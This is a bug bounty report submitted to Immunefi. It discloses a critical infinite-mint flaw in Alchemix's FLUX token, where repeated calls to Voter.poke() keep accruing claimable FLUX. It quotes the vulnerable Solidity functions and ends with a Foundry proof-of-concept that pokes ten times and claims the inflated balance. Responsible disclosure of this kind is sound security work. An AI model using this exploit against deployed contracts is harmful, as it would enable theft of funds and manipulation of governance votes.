# 31579 - \[SC - Critical] Infinite mint of FLUX using poke

Submitted on May 21st 2024 at 14:23:35 UTC by @konata for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31579

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

There is an infinite mint vulnerability for the FLUX token using the `poke` functionality of the `Voter` contract.

## Vulnerability Details

In the `_vote` function of the Voter contract, it calls into `FLUX.accrueFlux`, which increases the user's unclaimed FLUX balance from the VotingEscrow balance. It later calls `FLUX.updateFlux` to decrease it, but only with the amount of `boost`, which can simply be 0:

```
    function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
        _;
        IFluxToken(FLUX).accrueFlux(_tokenId);
        _;
        // Update flux balance of token if boost was used
        if (_boost > 0) {
            IFluxToken(FLUX).updateFlux(_tokenId, _boost);
        }
    }
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L412-L455>

The function `FLUX.accrueFlux` increases the balance using `VotingEscrow.claimableFlux(tokenId)`, which is a view function and stays the same depending on the amount and lock duration of the token ID:

```
    function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L188-L192>

`VotingEscrow.claimableFlux` does not depend on the amount of unclaimed FLUX in FluxToken for the user, and so the value returned from `claimableFlux` remains the same.

One can therefore simply call `Voter.poke()` over and over again, as this calls `FluxToken.accrueFlux` each time and uses a boost of 0. The user's `unclaimedFlux` in `FluxToken` would grow with the entire balance each time.

The user can then call `FluxToken.claimFlux` to turn the unclaimed FLUX into real ERC20 tokens that can be traded.

## Impact Details

The impact is an infinite mint of FLUX. This is a critical impact to not only the governance process (since FLUX can be used to boost), but also to the market and TVL of FLUX.

The vulnerability can be exploited by anyone and in the time frame of the same transaction.

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L412-L455>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L188-L192>

## Proof of Concept

A simple PoC that shows the attack scenario by calling `poke` each time.

```
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "./Token.sol";

import "src/FluxToken.sol";
import "src/Minter.sol";
import "src/Voter.sol";
import "src/VotingEscrow.sol";
import "src/factories/BribeFactory.sol";
import "src/factories/GaugeFactory.sol";
import "src/RewardsDistributor.sol";
import "src/RevenueHandler.sol";
import "src/RewardPoolManager.sol";

contract PoC is Test {

    Token alcx;
    Token bpt;
    FluxToken flux;
    VotingEscrow ve;
    Voter voter;
    Minter minter;
    BribeFactory bf;
    GaugeFactory gf;
    RewardPoolManager rpm;

    function setUp() public {
        _next_epoch();
        alcx = new Token("ALCX", "ALCX");
        bpt = new Token("BPT", "BPT");
        bf = new BribeFactory();
        gf = new GaugeFactory();
        flux = new FluxToken(address(this));
        ve = new VotingEscrow(address(bpt), address(alcx), address(flux), address(this));
        voter = new Voter(address(ve), address(gf), address(bf), address(flux), address(this));
        minter = new Minter(IMinter.InitializationParams({
            alcx: address(alcx),
            voter: address(voter),
            ve: address(ve),
            rewardsDistributor: address(this),
            revenueHandler: address(this),
            timeGauge: address(this),
            treasury: address(this),
            supply: 1793678e18,
            rewards: 12724e18,
            stepdown: 130e18
        }));
        rpm = new RewardPoolManager(address(this), address(ve), address(bpt), address(this), address(this));

        flux.setMinter(address(minter));
        flux.setVoter(address(voter));
        flux.setVeALCX(address(ve));

        ve.setVoter(address(voter));
        ve.setRewardPoolManager(address(rpm));

        voter.setMinter(address(minter));
    }

    function test_poc() public {
        bpt.approve(address(ve), type(uint).max);
        uint tokenId = ve.createLock(1 ether, 0, true);

        console.log(flux.balanceOf(address(this)));

        for (uint i; i < 10; i++) {
            voter.poke(tokenId);
        }

        flux.claimFlux(tokenId, flux.unclaimedFlux(tokenId));

        console.log(flux.balanceOf(address(this)));
    }
```
